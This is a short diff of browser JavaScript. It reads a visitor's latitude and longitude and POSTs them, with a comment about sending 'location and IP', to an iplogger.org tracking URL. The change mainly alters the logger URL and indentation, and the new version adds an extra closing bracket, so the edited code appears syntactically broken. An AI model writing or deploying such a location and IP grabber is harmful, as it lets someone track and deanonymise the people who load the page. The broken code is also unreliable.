@@ -20,15 +20,16 @@
             const longitude = position.coords.longitude;
 
             // Send location and IP to your IP Logger
-            fetch("https://iplogger.org/logger/gm5M4UdEkXyJ/#google_vignette", { 
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    latitude: latitude,
-                    longitude: longitude
-                })
+            fetch("https://iplogger.org/logger/gm5M4UdEkXyJ", { 
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        latitude: latitude,
+        longitude: longitude
+    })
+})
             }).then(response => {
                 alert(`Location Sent! Latitude: ${latitude}, Longitude: ${longitude}`);
             }).catch(error => {
